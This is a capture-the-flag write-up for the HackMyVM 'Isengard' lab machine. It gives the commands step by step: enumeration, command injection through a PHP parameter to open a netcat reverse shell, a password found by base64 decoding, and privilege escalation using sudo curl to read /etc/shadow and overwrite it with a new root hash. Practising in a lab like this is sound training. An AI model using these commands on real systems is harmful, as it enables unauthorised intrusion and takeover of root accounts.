### Write up for https://hackmyvm.eu/machines/machine.php?vm=Isengard ###

## Walkthrough



```bash
nmap -v -T4 -p- -sC -sV -oN nmap.log $ip  
```

```bash
firefox $ip
view page source >> main.css
http://$ip/main.css
```

at the bottom of css we found the following 
/* btw: in the robots.txt i have to put the url /y0ush4lln0tp4ss */


```bash
http://$ip/y0ush4lln0tp4ss
```

```bash
feroxbuster -e -x txt,php,html,zip,htm,bak -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://$ip/y0ush4lln0tp4ss/
wfuzz -t 500 -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hh BBB http://$ip/y0ush4lln0tp4ss/east/mellon.php?FUZZ{test}=id
```

```bash
nc -lvp 5555 ( to new terminal tab in order to get rs)
curl http://$ip/y0ush4lln0tp4ss/east/mellon.php?frodo=nc -e /bin/bash 10.100.100.110 5555 (on the main terminal tab)
```


get Better shell envirorment 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

ctrl+z

```bash
stty -a
```

```bash
stty raw -echo;fg
```

```bash
export SHELL=bash
export TERM=xterm
stty rows (values from stty -a) cols (values from stty -a)
```


```bash
 cd /tmp
```
 upload linpeas.sh
 sh linpeas.sh

 after examing linpeas findings we found

 /*/*/*/*/*/*/*/*.zip

after unzip, we get a txt with the pass of the user
its base64

```bash
cat *.txt | base64 -d
```
we get another base64 code

icode=*
```bash
echo $icode | base64 -d
```
then we finally get the pass "*CLX"

```bash
su sauron
```

```bash
sudo -l
```

we get curl
```bash
https://gtfobins.github.io/gtfobins/curl/
```

LFILE=/etc/shadow
```bash
curl file://$LFILE
```

```bash
mkpasswd 
$y$j9T$aRATgySCn2pv.gt/GJ8Lf1$3h70Cvhwzbm36gaassN7ZaTWRuWb5w0eCgrgmFQIY1/
```

modify the root with our own passwd

TF=$(mktemp)
```bash
echo DATA >$TF
curl "file://$TF" -o "$LFILE"
```

```bash
su root
```
(use your password)
